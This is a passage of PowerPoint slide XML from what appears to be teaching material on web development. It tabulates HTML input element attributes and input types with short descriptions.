                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>multiple emails (comma separated) or files (using control key)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10008"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="365720">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>name</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>unique name for a form field, submitted as name=value pair to server</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10009"/>
                  </a:ext>
                </a:extLst>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00EC9AB-1D43-4E13-983D-8DC223F48B96}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;input&gt; element attributes continued</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Taulukko 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{413391F7-EE5F-4382-AC66-090F7B2CA3C9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="1"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3991597272"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="1600200"/>
          <a:ext cx="10972800" cy="4246820"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1525960">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="862547018"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="9446840">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1650076885"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="370840">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val="3674374094"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>pattern</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>regular expression, which must be satisfied for the form to validate</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="344769417"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>placeholder</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>hint text displayed in an empty field</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2249548115"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>required</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>if present, user must fill this field</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1124246951"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>size</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>the</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width</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t> of </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>text</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password</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>, email, tel in </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>characters</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2216982150"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>step</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>numerical stepping for </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>number</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or</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range</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>field</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1148074866"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>tabindex</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>specifies the tab order of an element (when the "tab" button is used for navigating), running integer</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4239872151"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>title</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>extra "tooltip" information related to element e.g. text shown if pattern is not matched</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3201490420"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>type</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>button | checkbox | color | date |datetime-local | email | file | hidden | image | month | number | password | radio | range | reset | search | submit | </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>tel</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t> | </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
                        <a:t>text</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t> | time | </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>url</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t> |week</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1144758016"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>value</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>current value of the element (can also be used to give initial value)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1981962400"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35385466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8D79E084-FACB-4DCF-A179-6B223318ACA0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>&lt;input&gt; element types</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Content Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0D65F8A3-5929-4E02-877E-C0B40FE12440}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="1"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2668735462"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="1700213"/>
          <a:ext cx="10972800" cy="4079878"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1669976">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20000"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="9302824">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20001"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="370898">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Type</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45727" marB="45727"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Description</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45727" marB="45727"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10000"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370898">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>button</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45727" marB="45727"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>clickable button, value = text displayed. This will not do submit.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45727" marB="45727"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10001"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370898">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>checkbox</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45727" marB="45727"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>checkbox, multiple checkboxes of same name (but different value) can be selected</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45727" marB="45727"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10002"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370898">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>color </a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45727" marB="45727"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>color picker</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45727" marB="45727"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10003"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370898">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>date</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45727" marB="45727"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>select a date (year, month, day)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45727" marB="45727"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10004"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370898">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>email</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45727" marB="45727"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>email address</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45727" marB="45727"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10005"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370898">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>file</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45727" marB="45727"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>file path for file uploads</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45727" marB="45727"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10006"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370898">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>hidden</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45727" marB="45727"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>hidden field (not visible to user)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45727" marB="45727"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10007"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370898">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>image</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45727" marB="45727"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>bitmap image used as button, </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>src</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>="path", width, height</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45727" marB="45727"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10008"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370898">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>number</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45727" marB="45727"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>enter a number, limited by min and max attributes, step stepping, value = initial value</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45727" marB="45727"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10009"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370898">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
